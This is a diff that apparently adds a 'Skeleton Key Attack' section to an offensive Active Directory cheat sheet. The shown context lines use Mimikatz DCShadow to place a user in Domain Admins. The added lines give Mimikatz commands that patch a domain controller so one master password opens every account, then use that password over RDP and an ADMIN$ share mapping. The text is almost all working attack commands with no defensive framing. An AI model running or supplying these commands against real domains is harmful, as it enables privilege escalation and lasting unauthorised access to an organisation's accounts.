@@ -86,3 +86,10 @@ lsadump::dcshadow /object:POC User5 /attribute:primaryGroupID /value:512
 lsadump::dcshadow /push
 net group "Domain Admins" /domain
 ```
+### Skeleton Key Attack
+```
+privilege::debug #Check for '20' OK debug rights.
+misc::skeleton
+xfreerdp /v:10.10.10.9 /u:CEO /p:mimikatz /d:security.local
+net use Z: \\10.10.10.9\ADMIN$ /user:Administrator mimikatz
+```
